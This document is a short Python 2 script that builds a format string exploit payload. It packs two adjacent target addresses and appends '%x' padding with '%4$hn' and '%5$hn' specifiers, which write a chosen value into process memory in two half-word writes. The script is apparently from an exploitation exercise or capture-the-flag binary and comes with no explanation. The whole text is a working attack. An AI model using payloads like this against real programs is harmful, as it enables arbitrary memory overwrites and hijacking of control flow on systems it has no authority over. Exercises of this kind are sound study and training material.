import struct
tlow = struct.pack('I', 0x8049838)
thi = struct.pack('I', 0x804983a)
print thi + tlow + '%2044x' + '%4$hn' + '%31904x' + '%5$hn'
